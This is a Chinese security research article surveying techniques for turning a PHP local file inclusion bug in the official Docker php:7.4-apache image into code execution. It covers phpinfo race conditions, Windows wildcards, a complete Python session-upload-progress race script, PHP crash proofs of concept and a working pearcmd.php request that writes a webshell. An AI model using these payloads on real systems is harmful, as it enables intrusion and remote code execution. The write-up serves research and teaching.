# Docker PHP裸文件本地包含综述 | 离别歌
> 本文首发在[跳跳糖社区](https://tttang.com/archive/1312/)。

2018年『代码审计』星球举办的[Code-Breaking Puzzles](https://code-breaking.com/)非常成功，后面我就一直想再做一次类似的活动。Code-Breaking属于极其偏向于trick分享的代码审计谜题，所以要求题目具有一定的独创性，最好是能用10行以内的代码片段，描述一个具有实战价值的场景。

大概在去年疫情在家办公那段时间，有个同学问过我一个问题，他遇到了一个PHP文件包含漏洞，但找不到利用方法，目标是跑在Docker里，也没找到太多可以利用的文件。我当时觉得这是老生常谈的问题了，就跟他讲了几个我已知的方法，但后来我自己下去研究的时候又发现了一种新方法，个人感觉还挺适合放到Code-Breaking里作为题目的，就暂放到题库里了。

没想到Code-Breaking一直难产到了2021年，直到十一期间我在研究Caddy相关的安全问题时，无意间看到一篇RCTF 2021的Writeup，才发现这个trick被用掉了（最早出现在2020年巅峰极客比赛中）。有点心痛，于是把所有方法整理一下发表了这篇文章，也算没把研究成果浪费掉。

这篇文章研究的题目是：**在使用Docker官方的PHP镜像`php:7.4-apache`时，Web应用存在文件包含漏洞，在没有文件上传的情况下如何利用？**

我们可以使用docker启动一个服务器进行测试，命令是`docker run -d --name web -p 8080:80 -v $(pwd):/var/www/html php:7.4-apache`，文件包含的代码如下：

`<?php
include $_REQUEST['file'];` 

[0x01 日志文件包含为什么不行？](#0x01)
--------------------------

这个问题经常在实战中遇到了，特别是黑盒的情况下，功能点也少，找不到可以被包含的文件。通常此时我们会去尝试包含一些系统日志、Web日志等系统文件。

但是，如果目标在Docker环境中会具有如下特点：

*   容器只会运行Apache，所以没有第三方软件日志
*   Web日志重定向到了`/dev/stdout`、`/dev/stderr`

我们可以查看[PHP的Dockerfile](https://github.com/docker-library/php/blob/41d3146/7.4/buster/apache/Dockerfile#L85)，会发现有几个日志文件都被使用标准输出、标准错误的软链接替代了：

`# logs should go to stdout / stderr
    ln -sfT /dev/stderr "$APACHE_LOG_DIR/error.log"; \
    ln -sfT /dev/stdout "$APACHE_LOG_DIR/access.log"; \
    ln -sfT /dev/stdout "$APACHE_LOG_DIR/other_vhosts_access.log"; \
    # ...` 

此时包含这些Web日志会出现`include(/dev/pts/0): failed to open stream: Permission denied`的错误，因为PHP没有权限包含设备文件：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/30ae6399-4bd8-449d-8915-e5145d88f827.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/e8198610-1181-4f2b-8e49-c7348a9a9bef.png)

所以，利用日志包含来getshell的方法就无法进行了。

远程包含因为默认不开启，所以我们也不作为一个候选项，想要getshell还是需要找到一个可以控制内容的文件进行包含。

[0x02 phpinfo与条件竞争](#0x02-phpinfo)
----------------------------------

第二个想到的方法自然就是经典的临时文件包含，这个方法出自于Insomniasec的安全研究员Brett Moore在2011年的一篇Paper《[LFI WITH PHPINFO() ASSISTANCE](https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf)》。

我们对任意一个PHP文件发送一个上传的数据包时，不管这个PHP服务后端是否有处理`$_FILES`的逻辑，PHP都会将用户上传的数据先保存到一个临时文件中，这个文件一般位于系统临时目录，文件名是php开头，后面跟6个随机字符；在整个PHP文件执行完毕后，这些上传的临时文件就会被清理掉。

所以，临时文件的生命周期大概是这样（图来自[Gynvael Coldwind](https://gynvael.coldwind.pl/?id=50)）：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/b627e290-8431-4c7d-b1bf-5cf9a87dc3ab.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/16dc9c76-3d84-4dcf-9e36-669f4c743991.png)

在从“PHP writes data to temp file”到“php removes temp files(if any)”这两个操作之间的这段时间，我们可以包含这个临时文件，最后完成getshell操作。但这里面暗藏了一个大坑就是，**临时文件的文件名我们是不知道的**。

所以这个利用的条件就是，需要有一个地方能获取到文件名，例如phpinfo。phpinfo页面中会输出这次请求的所有信息，包括`$_FILES`变量的值，其中包含完整文件名：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/94e88543-a2cc-48ad-9e55-7e4752349590.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/97369ebf-0c5b-4fcd-94ca-382e92f06685.png)

但第二个难点就是，即使我们能够在目标网站上找到一个phpinfo页面并读取到临时文件名，这个文件名也是这一次请求里的临时文件，在这次请求结束后这个临时文件就会被删掉，并不能在后面的文件包含请求中使用。

所以此时需要利用到条件竞争（Race Condition），原理也好理解——我们用两个以上的线程来利用，其中一个发送上传包给phpinfo页面，并读取返回结果，找到临时文件名；第二个线程拿到这个文件名后马上进行包含利用。

这是一个很理想的状态，现实情况下我们需要借助下面这些方法来提高成功率：

*   使用大量线程来进行第二个操作，来让包含操作尽可能早于临时文件被删除
*   如果目标环境开启了`output_buffering`这个配置（在某些环境下是默认的），那么phpinfo的页面将会以流式，即chunked编码的方式返回。这样，我们可以不必等到phpinfo完全显示完成时就能够读取到临时文件名，这样成功率会更高
*   我们可以在请求头、query string里插入大量垃圾字符来使phpinfo页面更大，返回的时间更久，这样临时文件保存的时间更长。但这个方法在不开启`output_buffering`时是没有影响的。

经过测试我发现，不管目标环境是否开启`output_buffering`，都可以利用成功，可能只是成功率有所差别：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/619f1d9e-ab57-48f6-8fbc-e16f195c0578.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/ee3e922f-96c4-4f15-99d8-2101dacd6fe1.png)

这里面的[exp.py](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)即为原作者给出的利用脚本。我在Docker PHP 7.4下用150线程进行了大概20次尝试，最终成功，成功后会写入一个新的文件`/tmp/g`，这个文件就不会被删除了。

这个利用方法有一处真实案例可以参考：《[自如网某业务文件包含导致命令执行（LFI + PHPINFO getshell 实例）](http://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-0151653)》。

[0x03 Windows 通配符妙用](#0x03-windows)
-----------------------------------

0x02中的利用方法需要两个条件：

1.  存在phpinfo等可以泄露临时文件名的页面
2.  网络条件好，才能让Race Condition成功

特别是第一个，现在很少有机会让我们在实战中找到phpinfo页面。但是如果目标操作系统是Windows，我们可以借助一些特殊的Tricks来实现文件包含的利用。

PHP在读取Windows文件时，会使用到[FindFirstFileExW](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-findfirstfileexw)这个Win32 API来查找文件，而这个API是支持使用通配符的：

> **lpFileName**
> 
> The directory or path, and the file name. The file name can include wildcard characters, for example, an asterisk (*) or a question mark (?).

实际测试下来，PHP中星号和问号并不能直接作为通配符使用。

但我们在[MSDN官方文档](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-_fsrtl_advanced_fcb_header-fsrtlisnameinexpression)中还可以看到这样的说明：

> The following wildcard characters can be used in the pattern string.
> 
> Wildcard character Meaning
> 
> ***** (asterisk) Matches zero or more characters.
> 
> **?** (question mark) Matches a single character.
> 
> **DOS_DOT** Matches either a period or zero characters beyond the name string.
> 
> **DOS_QM** Matches any single character or, upon encountering a period or end of name string, advances the expression to the end of the set of contiguous DOS_QMs.
> 
> **DOS_STAR** Matches zero or more characters until encountering and matching the final . in the name.

其中除了星号和问号外，还提到了三个特殊符号DOS\_DOT、DOS\_QM、DOS_STAR，虽然官方并没有在文档中给出他们对应的值具体是什么，但在ntifs.h头文件中还是能找到他们的定义：

`//  The following constants provide addition meta characters to fully
//  support the more obscure aspects of DOS wild card processing.

#define DOS_STAR        (L'<')
#define DOS_QM          (L'>')
#define DOS_DOT         (L'"')` 

也就是说：

*   DOS_STAR：即 `<`，匹配0个以上的字符
*   DOS_QM：即`>`，匹配1个字符
*   DOS_DOT：即`"`，匹配点号

这样，我们在Windows下，可以使用上述通配符来替代临时文件名中的随机字符串：`C:\Windows\Temp\php<<`。（由于Windows内部的一些不太明确的原因，这里一般需要用两个`<`来匹配多个字符）

我们直接向含有文件包含漏洞的页面发送一个上传包：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/ddf2562b-99c7-4329-94d6-21e200ec786b.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/c6d69d9f-7ce0-4a16-b10f-15ef6baa1720.png)

根据前文给出的临时文件生命周期，我们上传的文件会在执行文件包含前被写入临时文件中；文件包含时我们借助Windows的通配符特性，在临时文件名未知的情况下成功包含，执行任意代码。

说句题外话，这种上传文件的同时利用临时文件的操作，我在另一篇文章《[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)》中也利用过，但是有的新人朋友还是很难理解这个过程：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/b37ec030-f5ff-42f3-bef3-a483f833911f.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/77f02128-e595-457e-8c6f-f8fa783eac4d.png)

这确实是一个比较需要从程序员思维转换到黑客思维的过程，很多人最难理解的地方为什么明明看似是两个操作（文件上传+文件包含），却在一个请求中执行了，如果有这个疑问，那么还是需要再继续理解理解整个流程。

[0x04 `session.upload_progress`与Session文件包含](#0x04-sessionupload_progresssession)
---------------------------------------------------------------------------------

上述的两个方法，其实都没有解决本篇文章遇到的问题，毕竟Docker环境即不存在phpinfo也不存在Windows特性。

第三个方法也已经广为流传，PHP中可以通过session progress功能实现临时文件的写入。这种利用方式需要满足下面几个条件：

*   目标环境开启了`session.upload_progress.enable`选项
*   发送一个文件上传请求，其中包含一个文件表单和一个名字是`PHP_SESSION_UPLOAD_PROGRESS`的字段
*   请求的Cookie中包含Session ID

这个方法的原理是，PHP在开启了`session.upload_progress.enable`后（在包括Docker的大部分环境下默认是开启的），将会把用户上传文件的信息保存在Session中，而PHP的Session默认是保存在文件里的。

所以当攻击者发送满足上述条件的数据包时，就等于能够控制Session文件内容。

我们可以尝试发送满足上述条件的数据包来测试一下，但会发现虽然我们可以让PHP开启Session，从而在/tmp目录下遗留下Session文件，但这个文件内容是空的。

原因是，PHP中还有另外一个配置项`session.upload_progress.cleanup`，默认开启。在这个选项开启时，PHP会在上传请求被读取完成后自动清理掉这个Session，如果我们尝试把这个选项关闭，就可以读取到Session文件的内容了：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/5811c0fb-c694-4fd4-b270-f1523a1f4afd.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/f328427d-cb91-4e7c-924c-0dacb8e34e8d.png)

> 注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有两个以上的文件上传。

所以，默认情况下，我们需要在Session文件被清理前利用它，这也会用到条件竞争（Race Condition）。

因为这里的Session文件名是可控的，所以相比于0x02的条件竞争，这个会简单很多。我写了一个小脚本来利用，几乎没有失败过：

`import threading
import requests
from concurrent.futures import ThreadPoolExecutor, wait

target = 'http://192.168.1.162:8080/index.php'
session = requests.session()
flag = 'helloworld'

def upload(e: threading.Event):
    files = [
        ('file', ('load.png', b'a' * 40960, 'image/png')),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': rf'''<?php file_put_contents('/tmp/success', '<?=phpinfo()?>'); echo('{flag}'); ?>'''}

    while not e.is_set():
        requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )

def write(e: threading.Event):
    while not e.is_set():
        response = requests.get(
            f'{target}?file=/tmp/sess_{flag}',
        )

        if flag.encode() in response.content:
            e.set()

if __name__ == '__main__':
    futures = []
    event = threading.Event()
    pool = ThreadPoolExecutor(15)
    for i in range(10):
        futures.append(pool.submit(upload, event))

    for i in range(5):
        futures.append(pool.submit(write, event))

    wait(futures)` 

脚本执行完毕后会在目标中写入`/tmp/success`文件，里面即为Webshell：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/fbce0469-ea9a-465b-a05a-78e32cab58b1.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/1d135d76-2103-4e78-b097-5c728bd72166.png)

[0x05 Segfault遗留下TEMP文件](#0x05-segfaulttemp)
--------------------------------------------

那么，如果关闭了`session.upload_progress.enable`，是否还有其他利用方法呢？

我们的目的是在服务器上留下一个内容可控的文件，最简单的方法就是利用上传包的临时文件。但这个临时文件之所以不能直接利用，原因有两点：

*   临时文件名是随机的
*   临时文件在请求结束后会被删除

如果说第一点我们可以通过爆破来解决，那么第二点是一定无法同时解决的——我们不可能在请求结束前爆破出临时文件名。

经过上面的分析，我们很容易想到一种解决方案：**如果我们可以让PHP进程在请求结束前出现异常退出执行，那么临时文件就可以免于被删除了**。

PHP底层是C语言开发的，不少内存错误都会导致进程异常退出，当然不论是Apache还是PHP-FPM都会存在master进程，在某一个子进程异常退出后会拉起新的进程来处理用户请求，不用担心搞挂服务器。

国内的安全研究者[@王一航](https://www.jianshu.com/p/dfd049924258) 曾发现过一个会导致PHP crash的方法：

`include 'php://filter/string.strip_tags/resource=/etc/passwd';` 

正好用在文件包含的逻辑中。

这个Bug在[7.1.20](https://github.com/php/php-src/commit/791f07e4f06a943bd7892bdc539a7313fb3d6d1e)以后被修复，也没有留下更新日志，我们可以使用7.1.19版本的PHP进行尝试。向文件包含的目标发送这个导致crash的路径，可见服务器已经挂了，返回空白：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/2cfcd0b7-c6f8-4ad8-a9cd-9e9cbbe6fba1.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/e6fd29e5-02b4-406a-829a-c13f2352057d.png)

我们可以尝试发送10次这个请求，然后来到容器里，可见有10个临时文件都被留在了/tmp目录里：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/ab39fe93-ae0b-45b1-8fd4-c7b82036f271.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/bbf32cb7-7ebe-4812-aca8-a4688ad0f19a.png)

这就好办了，我们剩下的工作就是爆破这10个临时文件的文件名。只要任意一个命中即可。

我们也可以在一个数据包里多放一些文件表单（默认最多可以有20个），然后多发送几次数据包，这样就可以在遗留下很多临时文件，极大地增加了爆破成功率，减少了爆破所需要的时间。

类似的还有后来[@wupco](https://bugs.php.net/bug.php?id=77231)发现的`php://filter`中另一个可以导致crash的方法，测试代码是：

`<?php
file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA'));` 

不过在文件包含场景下，这个POC涉及到`data:`协议，会因为`allow_url_include=Off`而失败。

除了这些利用文件包含本身来crash PHP进程的方法以外，通过一些更通用的无需依赖代码的crash方法也存在，比如[https://bugs.php.net/bug.php?id=78875](https://bugs.php.net/bug.php?id=78875)、[https://bugs.php.net/bug.php?id=78876](https://bugs.php.net/bug.php?id=78876)，但都有一些额外条件。

好在PHP是一个开源的语言，后续我们可以通过阅读底层源码，找找能在最新版本下利用的新crash点。

[0x06 `pearcmd.php`的巧妙利用](#0x06-pearcmdphp)
-------------------------------------------

最后这个是我想介绍的被我“捂烂了”的trick，就是利用`pearcmd.php`这个pecl/pear中的文件。

pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。

不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在`/usr/local/lib/php`。

原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。

我最早的时候是在阅读phpinfo()的过程中，发现Docker环境下的PHP会开启`register_argc_argv`这个配置。文档中对这个选项的介绍不是特别清楚，大概的意思是，当开启了这个选项，用户的输入将会被赋予给`$argc`、`$argv`、`$_SERVER['argv']`几个变量。

如果PHP以命令行的形式运行（即sapi是cli），这里很好理解。但如果PHP以Server的形式运行，且又开启了`register_argc_argv`，那么这其中是怎么处理的？

我们在PHP源码中可以看到这样的逻辑：

`static zend_bool php_auto_globals_create_server(zend_string *name)
{
    if (PG(variables_order) && (strchr(PG(variables_order),'S') || strchr(PG(variables_order),'s'))) {
        php_register_server_variables();

        if (PG(register_argc_argv)) {
            if (SG(request_info).argc) {
                zval *argc, *argv;

                if ((argc = zend_hash_find_ex_ind(&EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGC), 1)) != NULL &&
                    (argv = zend_hash_find_ex_ind(&EG(symbol_table), ZSTR_KNOWN(ZEND_STR_ARGV), 1)) != NULL) {
                    Z_ADDREF_P(argv);
                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGV), argv);
                    zend_hash_update(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), ZSTR_KNOWN(ZEND_STR_ARGC), argc);
                }
            } else {
                php_build_argv(SG(request_info).query_string, &PG(http_globals)[TRACK_VARS_SERVER]);
            }
        }

    } else {
        zval_ptr_dtor_nogc(&PG(http_globals)[TRACK_VARS_SERVER]);
        array_init(&PG(http_globals)[TRACK_VARS_SERVER]);
    }
    ...` 

第一个if语句判断`variables_order`中是否有`S`，即`$_SERVER`变量；第二个if语句判断是否开启register\_argc\_argv，第三个if语句判断是否有request_info.argc存在，如果不存在，其执行的是这条语句：

`php_build_argv(SG(request_info).query_string, &PG(http_globals)[TRACK_VARS_SERVER]);` 

无论php\_build\_argv函数内部是怎么处理的，`SG(request_info).query_string`都非常吸引我，这段代码是否意味着，HTTP数据包中的query-string会被作为argv的值？

果然：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/7a9b08ed-dafe-4c5d-a749-0a0bbbcbeb6b.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/27b750f3-bc90-46b9-b6de-0e21425f57d3.png)

其实这个结果是符合[RFC3875](http://www.ietf.org/rfc/rfc3875)的：

> 4.4. The Script Command Line
> 
> Some systems support a method for supplying an array of strings to  
> the CGI script. This is only used in the case of an 'indexed' HTTP  
> query, which is identified by a 'GET' or 'HEAD' request with a URI  
> query string that does not contain any unencoded "=" characters. For  
> such a request, the server SHOULD treat the query-string as a  
> search-string and parse it into words, using the rules
> 
> search-string = search-word _( "+" search-word )  
> search-word = 1_schar  
> schar = unreserved | escaped | xreserved  
> xreserved = ";" | "/" | "?" | ":" | "@" | "&" | "=" | "," |  
> "$"
> 
> After parsing, each search-word is URL-decoded, optionally encoded in  
> a system-defined manner and then added to the command line argument  
> list.

RFC3875中规定，如果query-string中不包含没有编码的`=`，且请求是GET或HEAD，则query-string需要被作为命令行参数。

当年PHP-CGI曾在这上面栽过跟头，具体的细节可以参考我以前写的这篇文章：《[PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析](https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html)》。PHP现在仍然没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给`$_SERVER['argv']`。

我们再来看到pear中获取命令行argv的函数：

`public static function readPHPArgv()
{
    global $argv;
    if (!is_array($argv)) {
        if (!@is_array($_SERVER['argv'])) {
            if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) {
                $msg = "Could not read cmd args (register_argc_argv=Off?)";
                return PEAR::raiseError("Console_Getopt: " . $msg);
            }
            return $GLOBALS['HTTP_SERVER_VARS']['argv'];
        }
        return $_SERVER['argv'];
    }
    return $argv;
}` 

先尝试`$argv`，如果不存在再尝试`$_SERVER['argv']`，后者我们可通过query-string控制。也就是说，我们通过Web访问了pear命令行的功能，且能够控制命令行的参数。

看看pear中有哪些可以利用的参数：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/ba2b17a2-95ea-441f-ab4e-7dd6edcdba8c.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/5b0b1d97-f739-4d67-b98b-82a6d889bd2c.png)

第一眼就看到config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。

所以，我构造出最后的利用数据包如下：

`GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
Host: 192.168.1.162:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close` 

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/8ce1cfa9-7bdd-4f1a-b5d0-1dd8f8b69100.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/25526495-da6c-4961-899a-0ca4c6c125bf.png)

发送这个数据包，目标将会写入一个文件`/tmp/hello.php`，其内容包含`<?=phpinfo()?>`：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/5336522d-8971-43f2-a7e9-08c8b2a05a15.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/8b834c20-e2bf-434e-a013-b88f518a6ca4.png)

然后，我们再利用文件包含漏洞包含这个文件即可getshell：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/12/9c6d6c77-67ce-448d-a6d4-f6d7fb7f491c.png?raw=true)
](https://www.leavesongs.com/media/attachment/2021/11/01/6d4093d4-1c7f-4433-86bb-ee0bb3446359.png)

最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过上述一个数据包搞定。

[0x07 参考链接](#0x07)
------------------

*   https://dl.packetstormsecurity.net/papers/general/LFI\_With\_PHPInfo_Assitance.pdf
*   http://www.madchat.fr/coding/php/secu/onsec.whitepaper-02.eng.pdf
*   https://stackoverflow.com/questions/24190389/findfirstfile-undocumented-wildcard-or-bug
*   https://stackoverflow.com/questions/2563316/findfirstfileex-wildcard-characters
*   https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-\_fsrtl\_advanced\_fcb\_header-fsrtlisnameinexpression
*   https://www.jianshu.com/p/dfd049924258
*   https://bugs.php.net/bug.php?id=77231
*   http://www.ietf.org/rfc/rfc3875